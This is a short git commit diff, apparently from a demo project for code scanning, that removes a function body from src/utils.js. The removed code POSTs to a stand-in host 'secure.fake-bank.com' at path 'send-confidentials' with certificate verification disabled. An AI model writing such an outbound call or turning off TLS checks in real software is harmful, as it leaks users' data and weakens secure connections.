b42fc93029ffaa5ee2ae6cc8f0d415ada0ec7c52
Jason Syu <Jason_Syu@asus.com>
2021-11-28 17:29:57 +0800

    fix all

--- src/utils.js
+++ src/utils.js
@@ -1,5 +1,3 @@
-const https = require('https');
-
 /**
  * Build Hello String
  * @param {string} token token to generate the output string
@@ -15,24 +13,6 @@ function getHelloString(token) {
  */
 function notCoveredFunc() {
   console.log('not covered');
-  //
-  const options = {
-    hostname: 'secure.fake-bank.com',
-    port: 443,
-    method: 'POST',
-    path: 'send-confidentials',
-    rejectUnauthorized: false, // bad disable, for demo
-  };
-  const req = https.request(options, (resp) => {
-    console.log(resp);
-  });
-  req.on('socket', (socket) => {
-    socket.setTimeout(500);
-    socket.on('timeout', () => req.destroy());
-  });
-  req.on('error', () => {});
-  req.end();
-  //
   return true;
 }
 
